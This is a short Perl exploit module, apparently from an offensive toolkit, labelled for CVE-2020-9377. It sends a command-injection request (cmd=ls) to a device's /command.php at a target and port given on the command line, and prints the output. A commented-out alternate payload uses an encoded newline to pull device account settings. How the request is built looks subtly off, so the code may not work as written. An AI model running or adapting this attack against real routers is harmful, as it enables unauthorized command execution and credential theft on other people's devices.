package Spellbook::Advisory::CVE_2020_9377 {
    use strict;
    use warnings;
    use Mojo::UserAgent;

    sub new {
        my $target = $ARGV[0];
        my $port   = $ARGV[1];

        if (($target) && ($port)) {
            my $endpoint = "http://$target:$port/command.php";
            
            my $payload  = {
                Cookie => "",
                cmd => "ls"
            };

            # my $payload  = "SERVICES=DEVICE.ACCOUNT%0aAUTHORIZED_GROUP=1";
            
            my $ua = Mojo::UserAgent -> new ();
            my $response = $ua -> post ($endpoint, $payload);
            
            print $response -> content();
        }

        return 0;
    }
}

1;